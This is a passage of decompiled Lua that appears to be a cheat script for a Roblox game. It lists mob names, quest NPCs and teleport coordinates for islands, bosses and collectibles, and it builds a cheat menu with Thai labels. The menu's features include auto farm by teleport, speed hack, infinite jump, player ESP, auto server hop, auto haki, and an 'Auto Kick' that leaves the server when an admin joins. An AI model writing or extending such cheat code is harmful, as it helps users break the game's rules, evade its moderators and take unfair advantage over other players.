        values.slimeLv.MobNames = values.mobNames14
        values.slimeLv.Island = "SlimeIsland"
        values.items41["Slime (Lv. 8000)"] = values.slimeLv
        values.academyTeacherLv = {}
        values.academyTeacherLv.QuestNPC = "QuestNPC15"
        values.mobNames15 = runtime.create(5)
        runtime.move(
            { "AcademyTeacher1", "AcademyTeacher2", "AcademyTeacher3", "AcademyTeacher4", "AcademyTeacher5" },
            1,
            5,
            1,
            values.mobNames15
        )
        values.academyTeacherLv.MobNames = values.mobNames15
        values.academyTeacherLv.Island = "AcademyIsland"
        values.items41["Academy Teacher (Lv. 9000)"] = values.academyTeacherLv
        values.swordsmanLv = {}
        values.swordsmanLv.QuestNPC = "QuestNPC16"
        values.mobNames16 = runtime.create(5)
        runtime.move(
            { "Swordsman1", "Swordsman2", "Swordsman3", "Swordsman4", "Swordsman5" },
            1,
            5,
            1,
            values.mobNames16
        )
        values.swordsmanLv.MobNames = values.mobNames16
        values.swordsmanLv.Island = "JudgementIsland"
        values.items41["Swordsman (Lv. 10000)"] = values.swordsmanLv
        values.quincyLv = {}
        values.quincyLv.QuestNPC = "QuestNPC17"
        values.mobNames17 = runtime.create(5)
        runtime.move({ "Quincy1", "Quincy2", "Quincy3", "Quincy4", "Quincy5" }, 1, 5, 1, values.mobNames17)
        values.quincyLv.MobNames = values.mobNames17
        values.quincyLv.Island = "SoulSociety"
        values.items41["Quincy (Lv. 10750)"] = values.quincyLv
        values.items42 = {}
        values.desertBandit = environment.CFrame.new(
            -793.224548,
            -4.22272682,
            -433.598755,
            -0.173624277,
            0,
            -0.984811902,
            0,
            1,
            0,
            0.984811902,
            0,
            -0.173624277
        )
        values.items42.DesertBandit = values.desertBandit
        values.academyTeacher = environment.CFrame.new(
            1072.54553,
            1.77835512,
            1275.64185,
            -0.305810213,
            0,
            0.952092826,
            0,
            1,
            0,
            -0.952092826,
            0,
            -0.305810213
        )
        values.items42.AcademyTeacher = values.academyTeacher
        values.curse = environment.CFrame.new(
            -18.3974705,
            1.88183689,
            -1845.56726,
            -0.516396642,
            0,
            -0.856349528,
            0,
            1,
            0,
            0.856349528,
            0,
            -0.516396642
        )
        values.items42.Curse = values.curse
        values.frostRogue = environment.CFrame.new(
            -410.850006,
            -1.1406424,
            -990.577637,
            0.390717864,
            0,
            -0.92051065,
            0,
            1,
            0,
            0.92051065,
            0,
            0.390717864
        )
        values.items42.FrostRogue = values.frostRogue
        values.hollow = environment.CFrame.new(
            -365.126282,
            -0.441406131,
            1097.68335,
            0.544665456,
            0,
            0.838653445,
            0,
            1,
            0,
            -0.838653445,
            0,
            0.544665456
        )
        values.items42.Hollow = values.hollow
        values.monkey = environment.CFrame.new(
            -567.758667,
            -0.875013351,
            399.302979,
            0.848060429,
            0,
            -0.529899538,
            0,
            1,
            0,
            0.529899538,
            0,
            0.848060429
        )
        values.items42.Monkey = values.monkey
        values.slime = environment.CFrame.new(
            -1124.75342,
            13.9179754,
            371.230652,
            0.948690832,
            0,
            0.316205174,
            0,
            1,
            0,
            -0.316205174,
            0,
            0.948690832
        )
        values.items42.Slime = values.slime
        values.sorcererStudent = environment.CFrame.new(
            1398.25928,
            8.60577106,
            488.05896,
            0.839569986,
            0,
            -0.543251514,
            0,
            1,
            0,
            0.543251514,
            0,
            0.839569986
        )
        values.items42.SorcererStudent = values.sorcererStudent
        values.strongSorcerer = environment.CFrame.new(
            666.406616,
            2.71704626,
            -1695.73657,
            -0.0956251621,
            -0.012393578,
            0.995340228,
            0.0104769832,
            0.999854565,
            0.0134563409,
            -0.995362282,
            0.0117149279,
            -0.0954813957
        )
        values.items42.StrongSorcerer = values.strongSorcerer
        values.quincy = environment.CFrame.new(
            -1344.96777,
            1601.35815,
            1592.86182,
            0.933587551,
            0,
            0.358349502,
            0,
            1,
            0,
            -0.358349502,
            0,
            0.933587551
        )
        values.items42.Quincy = values.quincy
        values.swordsman = environment.CFrame.new(
            -1274.65747,
            1.17532313,
            -1191.39014,
            0.57351917,
            0,
            -0.819192171,
            0,
            1,
            0,
            0.819192171,
            0,
            0.57351917
        )
        values.items42.Swordsman = values.swordsman
        values.thief = environment.CFrame.new(
            177.723145,
            11.2069092,
            -157.246826,
            0.139203906,
            0,
            0.99026376,
            0,
            1,
            0,
            -0.99026376,
            0,
            0.139203906
        )
        values.items42.Thief = values.thief
        values.thiefBoss = environment.CFrame.new(
            -66.6623611,
            -2.58425522,
            -162.956604,
            0.990270376,
            0,
            -0.13915664,
            0,
            1,
            0,
            0.13915664,
            0,
            0.990270376
        )
        values.items42.ThiefBoss = values.thiefBoss
        values.snowBoss = environment.CFrame.new(
            -594.788391,
            29.4299736,
            -1060.3761,
            -0.933587909,
            0,
            -0.358349502,
            0,
            1,
            0,
            0.358349502,
            0,
            -0.933587909
        )
        values.items42.SnowBoss = values.snowBoss
        values.pandaBoss = environment.CFrame.new(
            1688.40771,
            9.57414055,
            513.44574,
            0.854136884,
            0,
            0.520048261,
            0,
            1,
            0,
            -0.520048261,
            0,
            0.854136884
        )
        values.items42.PandaBoss = values.pandaBoss
        values.monkeyBoss = (
            environment.CFrame.new(
                -494.755676,
                49.2106781,
                496.789917,
                0.74715364,
                0,
                -0.664651334,
                0,
                1,
                0,
                0.664651334,
                0,
                0.74715364
            )
        )
        values.items42.MonkeyBoss = values.monkeyBoss
        values.desertBoss = environment.CFrame.new(
            -897.797302,
            2.34612894,
            -462.507629,
            -0.173624277,
            0,
            -0.984811902,
            0,
            1,
            0,
            0.984811902,
            0,
            -0.173624277
        )
        values.items42.DesertBoss = values.desertBoss
        values.callback5 = functions.handleMatch(environment, values.items42)
        values.values14 = runtime.create(4)
        runtime.move({ "None", "IchigoBoss", "SaberBoss", "QinShiBoss" }, 1, 4, 1, values.values14)
        values.items43 = {}
        values.items43.Z = 1
        values.items43.X = 2
        values.items43.C = 3
        values.items43.V = 4
        values.items43.F = 5
        values.items44 = {}
        values.new44 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.snowIsland = values.new44(
            -234.127533,
            -1.80199099,
            -979.563721,
            0.92051065,
            0,
            0.390717506,
            0,
            1,
            values.numberValueState4.value,
            -0.390717506,
            0,
            0.92051065
        )
        values.items44.SnowIsland = values.snowIsland
        values.new45 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.shibuyaStation = values.new45(
            1359.47205,
            10.5156441,
            249.582214,
            0.978984475,
            0,
            -0.203934819,
            0,
            1,
            values.numberValueState4.value,
            0.203934819,
            0,
            0.978984475
        )
        values.items44.ShibuyaStation = values.shibuyaStation
        values.new46 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.sailorIsland = values.new46(
            235.137619,
            3.10643435,
            659.73407,
            0.987685978,
            0,
            0.156449571,
            0,
            1,
            values.numberValueState4.value,
            -0.156449571,
            0,
            0.987685978
        )
        values.items44.SailorIsland = values.sailorIsland
        values.new47 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.jungleIsland = values.new47(
            -446.587311,
            -3.56074214,
            368.797546,
            0.848060429,
            0,
            -0.529899538,
            0,
            1,
            values.numberValueState4.value,
            0.529899538,
            0,
            0.848060429
        )
        values.items44.JungleIsland = values.jungleIsland
        values.new48 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.desertIsland = values.new48(
            -694.385681,
            -2.13288236,
            -348.545624,
            0.984812498,
            0,
            -0.173621148,
            0,
            1,
            values.numberValueState4.value,
            0.173621148,
            0,
            0.984812498
        )
        values.items44.DesertIsland = values.desertIsland
        values.new49 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.bossIsland = values.new49(
            620.293579,
            -1.53785121,
            -1055.65271,
            0.694649816,
            0,
            0.719348073,
            0,
            1,
            values.numberValueState4.value,
            -0.719348073,
            0,
            0.694649816
        )
        values.items44["Boss Island"] = values.bossIsland
        values.new50 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.starterIsland = values.new50(
            -94.7449417,
            -1.98583961,
            -244.801849,
            0.990270376,
            0,
            -0.13915664,
            0,
            1,
            values.numberValueState4.value,
            0.13915664,
            0,
            0.990270376
        )
        values.items44.StarterIsland = values.starterIsland
        values.new51 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.huecoMundoIsland = values.new51(
            -482.868896,
            -2.05866098,
            936.237061,
            0.838688612,
            0,
            -0.544611216,
            0,
            1,
            values.numberValueState4.value,
            0.544611216,
            0,
            0.838688612
        )
        values.items44.HuecoMundoIsland = values.huecoMundoIsland
        values.new52 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.shibuyaDestroyed = values.new52(
            365.327393,
            -0.669448137,
            -1633.19067,
            0.99977088,
            0,
            0.0214066338,
            0,
            1,
            values.numberValueState4.value,
            -0.0214066338,
            0,
            0.99977088
        )
        values.items44.ShibuyaDestroyed = values.shibuyaDestroyed
        values.new53 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.slimeIsland = values.new53(
            -985.487488,
            3.66299438,
            254.98291,
            0.842490435,
            0,
            0.538711369,
            0,
            1,
            values.numberValueState4.value,
            -0.538711369,
            0,
            0.842490435
        )
        values.items44.SlimeIsland = values.slimeIsland
        values.new54 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.academyIsland = values.new54(
            1040.29395,
            -2.02119446,
            1088.76904,
            0.927179396,
            0,
            0.374617696,
            0,
            1,
            values.numberValueState4.value,
            -0.374617696,
            0,
            0.927179396
        )
        values.items44.AcademyIsland = values.academyIsland
        values.new55 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.judgementIsland = values.new55(
            -955.842651,
            -0.403253078,
            -1061.56335,
            0.573598742,
            0,
            -0.81913656,
            0,
            1,
            values.numberValueState4.value,
            0.81913656,
            0,
            0.573598742
        )
        values.items44.JudgementIsland = values.judgementIsland
        values.new56 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.dungeonIsland =
            values.new56(1298, 4, -841, 1, 0, 0, 0, 1, values.numberValueState4.value, 0, 0, 1)
        values.items44.DungeonIsland = values.dungeonIsland
        values.new57 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.soulSociety = values.new57(
            -1247.59827,
            1605.29688,
            1556.03833,
            0.933587551,
            0,
            0.358349502,
            0,
            1,
            values.numberValueState4.value,
            -0.358349502,
            0,
            0.933587551
        )
        values.items44.SoulSociety = values.soulSociety
        values.items45 = {}
        values.items45.StarterIsland = "Starter"
        values.items45.JungleIsland = "Jungle"
        values.items45.DesertIsland = "Desert"
        values.items45.SnowIsland = "Snow"
        values.items45.SailorIsland = "Sailor"
        values.items45.ShibuyaStation = "Shibuya"
        values.items45.HuecoMundoIsland = "HuecoMundo"
        values.items45["Boss Island"] = "Boss"
        values.items45.BossIsland = "Boss"
        values.items45.DungeonIsland = "Dungeon"
        values.items45.ShibuyaDestroyed = "Shinjuku"
        values.items45.SlimeIsland = "Slime"
        values.items45.AcademyIsland = "Academy"
        values.items45.JudgementIsland = "Judgement"
        values.items45.SoulSociety = "SoulSociety"
        values.items46 = {}
        values.new58 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.slime2 = values.new58(
            -855.035645,
            -0.668930054,
            -321.864471,
            0.173624337,
            0,
            0.984811902,
            values.numberValueState4.value,
            1,
            0,
            -0.984811902,
            0,
            0.173624337
        )
        values.items46["Slime #1"] = values.slime2
        values.new59 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.slime3 = values.new59(
            -434.946747,
            20.9471989,
            -1183.79749,
            -0.92051065,
            0,
            -0.390717506,
            values.numberValueState4.value,
            1,
            0,
            0.390717506,
            0,
            -0.92051065
        )
        values.items46["Slime #2"] = values.slime3
        values.new60 = environment.CFrame.new
        values.numberValueState4.value = -0.000830069184
        values.slime4 = values.new60(
            61.1317139,
            32.3345795,
            -144.244934,
            -0.0814757347,
            -0.165915847,
            0.982768416,
            values.numberValueState4.value,
            0.98605758,
            0.16640234,
            -0.996675014,
            0.0127419755,
            -0.0804774761
        )
        values.items46["Slime #3"] = values.slime4
        values.new61 = environment.CFrame.new
        values.numberValueState4.value = -0.00456225872
        values.slime5 = values.new61(
            -583.711487,
            54.8365974,
            317.217133,
            -0.528159916,
            -0.346896499,
            -0.775054812,
            values.numberValueState4.value,
            0.913893461,
            -0.405928463,
            0.849132717,
            -0.21085912,
            -0.484264493
        )
        values.items46["Slime #4"] = values.slime5
        values.new62 = environment.CFrame.new
        values.numberValueState4.value = 0
        values.slime6 = values.new62(
            1744.80322,
            6.84498835,
            494.509399,
            0.141693771,
            0,
            0.989910543,
            values.numberValueState4.value,
            1,
            0,
            -0.989910543,
            0,
            0.141693771
        )
        values.items46["Slime #5"] = values.slime6
        values.new63 = environment.CFrame.new
        values.numberValueState4.value = -0.0145941973
        values.slime7 = values.new63(
            -435.404419,
            23.0172634,
            1399.24365,
            -0.324690163,
            0.16521655,
            0.931278586,
            values.numberValueState4.value,
            0.983632803,
            -0.179592893,
            -0.945707858,
            -0.0719033182,
            -0.316964686
        )
        values.items46["Slime #6"] = values.slime7
        values.new64 = environment.CFrame.new
        values.numberValueState4.value = 0.06376867
        values.slime8 = values.new64(
            787.80127,
            64.3216553,
            -2309.12842,
            -0.196157262,
            0.654697776,
            -0.72999537,
            values.numberValueState4.value,
            0.751399636,
            0.656758904,
            0.97849679,
            0.0822771788,
            -0.189141691
        )
        values.items46["Slime #7"] = values.slime8
        values.items47 = {}
        values.new65 = environment.CFrame.new
        values.numberValueState4.value = -0.13915664
        values.jigsaw = values.new65(
            89.9129028,
            8.48682785,
            -136.653168,
            0.990270376,
            0,
            values.numberValueState4.value,
            0,
            1,
            0,
            0.13915664,
            0,
            0.990270376
        )
        values.items47["Jigsaw #1"] = values.jigsaw
        values.new66 = environment.CFrame.new
        values.numberValueState4.value = -0.921333969
        values.jigsaw2 = values.new66(
            -396.155457,
            -0.644790649,
            510.067932,
            0.369634688,
            0.120474108,
            values.numberValueState4.value,
            -0.264767796,
            0.96410799,
            0.0198437124,
            0.890656054,
            0.236604616,
            0.388265431
        )
        values.items47["Jigsaw #2"] = values.jigsaw2
        values.new67 = environment.CFrame.new
        values.numberValueState4.value = 0.977625668
        values.jigsaw3 = values.new67(
            -1055.74548,
            5.37958527,
            -306.656342,
            -0.0325618275,
            -0.207816705,
            values.numberValueState4.value,
            0.0831441581,
            0.974190712,
            0.209855825,
            -0.996005356,
            0.0881171525,
            -0.0144426851
        )
        values.items47["Jigsaw #3"] = values.jigsaw3
        values.new68 = environment.CFrame.new
        values.numberValueState4.value = 0.390717506
        values.jigsaw4 = values.new68(
            -313.635284,
            -2.38616896,
            -1188.1344,
            0.92051065,
            0,
            values.numberValueState4.value,
            0,
            1,
            0,
            -0.390717506,
            0,
            0.92051065
        )
        values.items47["Jigsaw #4"] = values.jigsaw4
        values.new69 = environment.CFrame.new
        values.numberValueState4.value = -0.145067453
        values.jigsaw5 = values.new69(
            1717.1012,
            138.38591,
            -27.2578392,
            0.989420116,
            0.00180168322,
            values.numberValueState4.value,
            -0.00181423908,
            0.999998331,
            4.57420974e-05,
            0.145067304,
            0.000217928886,
            0.989421785
        )
        values.items47["Jigsaw #5"] = values.jigsaw5
        values.new70 = environment.CFrame.new
        values.numberValueState4.value = -0.945519149
        values.jigsaw6 = values.new70(
            -685.611206,
            98.1761932,
            1335.40051,
            0.325435102,
            0.00925869402,
            values.numberValueState4.value,
            -0.0284054689,
            0.999596477,
            1.14431605e-05,
            0.94513768,
            0.0268541873,
            0.325566828
        )
        values.items47["Jigsaw #6"] = values.jigsaw6
        values.items48 = {}
        values.new71 = environment.CFrame.new
        values.numberValueState4.value = -0.161282077
        values.demonite = values.new71(
            1006.00696,
            11.7496796,
            1130.03369,
            0.427068621,
            values.numberValueState4.value,
            0.889719307,
            -0.0035789907,
            0.983654976,
            0.180028006,
            -0.904212117,
            -0.0800686479,
            0.419510931
        )
        values.items48["Demonite #1"] = values.demonite
        values.new72 = environment.CFrame.new
        values.numberValueState4.value = -0.576960802
        values.demonite2 = values.new72(
            920.795715,
            70.3931427,
            1478.13025,
            0.725795209,
            values.numberValueState4.value,
            0.374616534,
            0.622277141,
            0.782796979,
            -7.01099634e-06,
            -0.29324463,
            0.233120382,
            0.927179873
        )
        values.items48["Demonite #2"] = values.demonite2
        values.items49 = {}
        values.new73 = environment.CFrame.new
        values.numberValueState4.value = 0.289160162
        values.hogyoku = values.new73(
            -424.589447,
            56.6024628,
            -1235.32568,
            values.numberValueState4.value,
            0.168315515,
            0.942367375,
            -0.00751689076,
            0.984790087,
            -0.173586085,
            -0.957251191,
            0.0431105494,
            0.286027253
        )
        values.items49["Hogyoku #1"] = values.hogyoku
        values.new74 = environment.CFrame.new
        values.numberValueState4.value = 0.923215747
        values.hogyoku2 = values.new74(
            -636.008423,
            22.5490417,
            1206.28113,
            values.numberValueState4.value,
            -0.345341593,
            0.16855821,
            0.381870717,
            0.873518467,
            -0.301894605,
            -0.0429819599,
            0.343081295,
            0.938321829
        )
        values.items49["Hogyoku #2"] = values.hogyoku2
        values.new75 = environment.CFrame.new
        values.numberValueState4.value = 0.772088885
        values.hogyoku3 = values.new75(
            648.099976,
            137.94455,
            -2069.59741,
            values.numberValueState4.value,
            -0.631137073,
            0.0744634345,
            0.628663361,
            0.775662899,
            0.0559423678,
            -0.0930658206,
            0.00361994654,
            0.995653391
        )
        values.items49["Hogyoku #3"] = values.hogyoku3
        values.new76 = environment.CFrame.new
        values.numberValueState4.value = 0.989795089
        values.hogyoku4 = values.new76(
            1636.70898,
            85.5206757,
            247.291901,
            values.numberValueState4.value,
            0,
            -0.142497987,
            0,
            1,
            0,
            0.142497987,
            0,
            0.989795089
        )
        values.items49["Hogyoku #4"] = values.hogyoku4
        values.new77 = environment.CFrame.new
        values.numberValueState4.value = 0.993406057
        values.hogyoku5 = values.new77(
            -1206.52283,
            30.8849335,
            463.206787,
            values.numberValueState4.value,
            -0.0171359815,
            0.113360971,
            -0.00357546285,
            0.983655572,
            0.180024818,
            -0.114593059,
            -0.179243073,
            0.977108181
        )
        values.items49["Hogyoku #5"] = values.hogyoku5
        values.new78 = environment.CFrame.new
        values.numberValueState4.value = 0.990366459
        values.hogyoku6 = values.new78(
            -906.39801,
            15.7299957,
            -1260.2478,
            values.numberValueState4.value,
            0,
            -0.138471082,
            0,
            1,
            0,
            0.138471082,
            0,
            0.990366459
        )
        values.items49["Hogyoku #6"] = values.hogyoku6
        values.gValue35 = environment._G
        values.gValue35.IsPortaling = false
        values.callback6 = functions.handlePcall2(environment, values.items45)
        values.callback7 = functions.handlePairs(environment, values.items44)
        values.gameValue15 = environment.game
        values.numberValueState4.value = values.gameValue15
        values.tweenService = values.gameValue15.GetService(values.numberValueState4.value, "TweenService")
        values.numberValueState4.value = 0
        values.gValue36 = environment._G
        values.gValue36.TeleportTicket = 0
        values.callback8 = functions.handleNew2(
            environment,
            values.callback7,
            values.numberValueState4,
            values.callback6,
            values.tweenService
        )
        values.callback9 =
            functions.handleCallback4(environment, values.callback7, values.items45, values.callback6)
        values.callback10 = functions.handleFindFirstChildAtLine1(environment, values.callback8)
        values.callback11 = functions.handleIsA(environment)
        values.callback12 = functions.handlePcallAtLine5(environment, values.localPlayer2)
        values.gValue37 = environment._G
        values.gValue37.FarmDistanceBehind = 4
        values.gValue38 = environment._G
        values.gValue38.FarmDistanceAbove = 11
        values.callback13 = functions.handleNew5(environment)
        values.enabledState.value = false
        values.callback14 =
            functions.handlePcallAtLine79(environment, values.sharedValueState4, values.enabledState)
        values.stepped = values.runService.Stepped
        values.stepped.Connect(
            values.stepped,
            functions.handlePcallAtLine7(
                environment,
                values.localPlayer2,
                values.players,
                values.options,
                functions.handleNew6(environment),
                functions.handleFindFirstChild3(environment)
            )
        )
        values.characterAdded = values.localPlayer2.CharacterAdded
        values.characterAdded.Connect(
            values.characterAdded,
            functions.handleFireServerAtLine1(
                environment,
                values.options,
                values.replicatedStorage,
                values.items17
            )
        )
        values.renderStepped = values.runService.RenderStepped
        values.renderStepped.Connect(
            values.renderStepped,
            functions.handleFindFirstChildAtLine25(environment, values.localPlayer2)
        )
        values.jumpRequest = values.userInputService.JumpRequest
        values.jumpRequest.Connect(
            values.jumpRequest,
            functions.handleFindFirstChildAtLine67(environment, values.localPlayer2)
        )
        values.callback15 = functions.handleFindFirstChild2(environment, values.localPlayer2, values.items40)
        values.main2 = values.items31.Main
        values.main2.AddSection(values.main2, "Main Features")
        values.callback16 = functions.handlePcall6(environment)
        values.main3 = values.items31.Main
        values.addToggle15 = values.main3.AddToggle
        values.items50 = {}
        values.items50.Title = "Auto Kick (เตะออกเมื่อแอดมินเข้า)"
        values.items50.Default = false
        values.value15 = (values.addToggle15(values.main3, "AntiAdmin", values.items50))
        values.value15.OnChanged(values.value15, functions.handleGetPlayers(environment, values.callback16))
        values.playerAdded = environment.game.Players.PlayerAdded
        values.playerAdded.Connect(
            values.playerAdded,
            functions.handleCallback12(environment, values.callback16)
        )
        values.main4 = values.items31.Main
        values.addToggle16 = values.main4.AddToggle
        values.items51 = {}
        values.items51.Title = "White Screen"
        values.items51.Default = false
        values.value16 = (values.addToggle16(values.main4, "Disable3DRender", values.items51))
        values.value16.OnChanged(values.value16, functions.handlePcall7(environment))
        values.main5 = values.items31.Main
        values.addToggle17 = values.main5.AddToggle
        values.items52 = {}
        values.items52.Title = "Auto Server Hop"
        values.items52.Default = false
        values.value17 = (values.addToggle17(values.main5, "AutoServerHop", values.items52))
        values.value17.OnChanged(values.value17, functions.handleCallback31(environment))
        environment.task.spawn(functions.handlePcallAtLine78(environment))
        values.main6 = values.items31.Main
        values.addToggle18 = values.main6.AddToggle
        values.items53 = {}
        values.items53.Title = "Speed hack"
        values.items53.Default = false
        values.value18 = (values.addToggle18(values.main6, "SpeedHack", values.items53))
        values.value18.OnChanged(
            values.value18,
            functions.handleFindFirstChild4(environment, values.localPlayer2)
        )
        values.main7 = values.items31.Main
        values.addToggle19 = values.main7.AddToggle
        values.items54 = {}
        values.items54.Title = "Infinity Jump"
        values.items54.Default = false
        values.value19 = (values.addToggle19(values.main7, "InfJump", values.items54))
        values.value19.OnChanged(values.value19, functions.handleCallback25(environment))
        values.main8 = values.items31.Main
        values.addToggle20 = values.main8.AddToggle
        values.items55 = {}
        values.items55.Title = "ESP Player"
        values.items55.Default = false
        values.value20 = (values.addToggle20(values.main8, "ESPPlayer", values.items55))
        values.value20.OnChanged(
            values.value20,
            functions.handleGetPlayersAtLine1(
                environment,
                functions.handleConnect(environment, values.localPlayer2),
                functions.handleFindFirstChildAtLine99(environment)
            )
        )
        values.instanceObject = environment.Instance.new("Part")
        values.instanceObject.Name = "LumeAntiVoid"
        values.new79 = environment.Vector3.new
        values.itemsState.value = 99999
        values.size2 = values.new79(99999, 10, values.itemsState.value)
        values.instanceObject.Size = values.size2
        values.new80 = environment.Vector3.new
        values.itemsState.value = 0
        values.position = values.new80(0, -150, values.itemsState.value)
        values.instanceObject.Position = values.position
        values.instanceObject.Anchored = true
        values.instanceObject.Transparency = 1
        values.instanceObject.CanCollide = false
        values.parent = environment.workspace
        values.instanceObject.Parent = values.parent
        values.main9 = values.items31.Main
        values.main9.AddSection(values.main9, "Auto Haki")
        values.main10 = values.items31.Main
        values.addToggle21 = values.main10.AddToggle
        values.itemsState.value = {}
        values.itemsState.value.Title = "Auto Haki"
        values.itemsState.value.Default = false
        values.value21 = (values.addToggle21(values.main10, "AutoHaki", values.itemsState.value))
        values.value21.OnChanged(
            values.value21,
            functions.handleFindFirstChildAtLine40(
                environment,
                values.options,
                values.items17,
                values.replicatedStorage
            )
        )
        values.main11 = values.items31.Main
        values.addToggle22 = values.main11.AddToggle
        values.itemsState.value = {}
        values.itemsState.value.Title = "Auto Observation"
        values.itemsState.value.Default = false
        values.addToggle22(values.main11, "AutoObservationHaki", values.itemsState.value)
        values.main12 = values.items31.Main
        values.addToggle23 = values.main12.AddToggle
        values.itemsState.value = {}
        values.itemsState.value.Title = "Auto Haki Conqueror"
        values.itemsState.value.Default = false
        values.addToggle23(values.main12, "AutoConquerorHaki", values.itemsState.value)
        values.autoFarm8 = values.items31.AutoFarm
        values.autoFarm8.AddSection(values.autoFarm8, "Weapon Settings")
        values.autoFarm9 = values.items31.AutoFarm
        values.addDropdown5 = values.autoFarm9.AddDropdown
        values.itemsState.value = {}
        values.itemsState.value.Title = "Select Weapon"
        values.values15 = runtime.create(2)
        values.autoFarmState.value = "Combat"
        values.textValueState2.value = "Sword"
        runtime.move({ values.autoFarmState.value, values.textValueState2.value }, 1, 2, 1, values.values15)
        values.itemsState.value.Values = values.values15
        values.itemsState.value.Multi = false
        values.itemsState.value.Default = 1
        values.value22 = (values.addDropdown5(values.autoFarm9, "SelectWeapon", values.itemsState.value))
        values.value22.OnChanged(values.value22, functions.handleCallback28(environment))
        values.autoFarm10 = values.items31.AutoFarm
        values.addToggle24 = values.autoFarm10.AddToggle
        values.itemsState.value = {}
        values.itemsState.value.Title = "Auto Equip Weapon"
        values.itemsState.value.Default = false
        values.value23 = (values.addToggle24(values.autoFarm10, "AutoEquip", values.itemsState.value))
        values.value23.OnChanged(values.value23, functions.handleSpawn9(environment, values.callback15))
        values.autoFarm11 = values.items31.AutoFarm
        values.autoFarm11.AddSection(values.autoFarm11, "Method Farm")
        values.gValue39 = environment._G
        values.gValue39.MoveMethod = "TP"
        values.autoFarm12 = values.items31.AutoFarm
        values.addDropdown6 = values.autoFarm12.AddDropdown
        values.itemsState.value = {}
        values.itemsState.value.Title =
            "Farm Method (เลือกการวาร์ปที่จะฟาร์ม)"
        values.values16 = runtime.create(2)
        values.autoFarmState.value = "TP"
        values.textValueState2.value = "Tween"
        runtime.move({ values.autoFarmState.value, values.textValueState2.value }, 1, 2, 1, values.values16)
        values.itemsState.value.Values = values.values16
        values.itemsState.value.Multi = false
        values.itemsState.value.Default = 1
        values.value24 = (values.addDropdown6(values.autoFarm12, "SelectMoveMethod", values.itemsState.value))
        values.value24.OnChanged(values.value24, functions.handleCallback32(environment))
        values.autoFarm13 = values.items31.AutoFarm
        values.autoFarm13.AddSection(values.autoFarm13, "Mob Farm")
        values.values17 = {}
        values.callResults8 = runtime.pack(environment.pairs(values.items41))
        values.callResults9 = values.callResults8
        values.itemsState.value = values.callResults9[3]
        values.savedIterations5 = { nil, [5] = nil, nil, nil }
        values.result27 = runtime.wrapIterator(runtime.iteratorBody1)
        values.result27(values.callResults9[1], values.callResults9[2], values.itemsState.value)
        values.iteratorKey4 = nil
        values.iterationCursor5 = values.result27
        while true do
            values.hasNext3, values.iteratorKey6, values.iteratorValue3 = values.iterationCursor5()
            if not values.hasNext3 then
            else
                values.iteratorKey4 = values.iteratorKey6
            end
            if values.hasNext3 then
                values.insert = environment.table.insert
                values.autoFarmState.value = values.values17
                values.textValueState2.value = values.iteratorKey4
                values.insert(values.autoFarmState.value, values.textValueState2.value)
                continue
            end
            break
        end
        values.iterationCursor6 = values.savedIterations5[3]
        values.iterationLimit3 = values.savedIterations5[2]
        values.iterationStep3 = values.savedIterations5[5]
        values.savedIterations6 = values.savedIterations5[1]
        values.sort = environment.table.sort
        values.itemsState.value = functions.handleMatchAtLine1(environment)
        values.sort(values.values17, values.itemsState.value)
        values.autoFarm14 = values.items31.AutoFarm
        values.addDropdown7 = values.autoFarm14.AddDropdown
        values.itemsState.value = "SelectMob"
        values.items56 = {}
        values.items56.Title = "Select Mob"
        values.items56.Values = values.values17
        values.items56.Multi = false
        values.items56.Default = 1
        values.value25 = (values.addDropdown7(values.autoFarm14, values.itemsState.value, values.items56))
        values.onChanged = values.value25.OnChanged
        values.itemsState.value = functions.handleFireServer3(environment, values.sharedValueState)
        values.onChanged(values.value25, values.itemsState.value)
        values.autoFarm = values.items31.AutoFarm
        values.addToggle = values.autoFarm.AddToggle
        values.itemsState.value = "AutoMobFarm"
        values.items = {}
        values.items.Title = "Auto Farm"
        values.items.Default = false
        values.value = (values.addToggle(values.autoFarm, values.itemsState.value, values.items))
        values.onChanged2 = values.value.OnChanged
        values.itemsState.value = functions.handleSpawn8(
            environment,
            values.items41,
            values.callback6,
            values.localPlayer2,
            values.textValueState,
            values.callback12,
            values.callback13,
            values.callback8,
            values.callback15,
            values.callback14,
            values.callback5,
            values.items44
        )
        values.onChanged2(values.value, values.itemsState.value)
        values.callback = functions.handleFindFirstChildAtLine105(environment)
        values.callback2 = functions.handleCallbackAtLine1449(environment, values.callback, values.items41)
        values.itemsState.value = nil
        values.autoFarm2 = values.items31.AutoFarm
        values.autoFarmState.value = values.autoFarm2
        values.addToggle2 = values.autoFarm2.AddToggle
        values.textValueState2.value = "AutoFarmLevel"
        values.itemsState2.value = {}
        values.itemsState2.value.Title =
            "Auto Farm Level (ฟาร์มตามเลเวลอัตโนมัติ)"
        values.itemsState2.value.Default = false
        values.value2 = (
            values.addToggle2(
                values.autoFarmState.value,
                values.textValueState2.value,
                values.itemsState2.value
            )
        )
        values.autoFarmState.value = values.value2
        values.onChanged3 = values.value2.OnChanged
        values.textValueState2.value =
            functions.selectedAllMobs(environment, values.itemsState, values.callback2, values.callback6)
        values.onChanged3(values.autoFarmState.value, values.textValueState2.value)
        values.spawn = environment.task.spawn
        values.autoFarmState.value = functions.handleWaitAtLine101(
            environment,
            values.options,
            values.callback2,
            values.localPlayer2,
            values.itemsState,
            values.sharedValueState,
            values.textValueState,
            values.callback12,
            values.callback13,
            values.callback8,
            values.callback15,
            values.callback14,
            values.callback,
            values.callback5,
            values.items44
        )
        values.spawn(values.autoFarmState.value)
        values.autoFarm3 = values.items31.AutoFarm
        values.autoFarmState.value = values.autoFarm3
        values.addDropdown = values.autoFarm3.AddDropdown
        values.textValueState2.value = "SelectPosition"
        values.itemsState2.value = {}
        values.itemsState2.value.Title = "Farm Position (ตำแหน่งฟาร์ม)"
        values.valuesState.value = runtime.create(2)
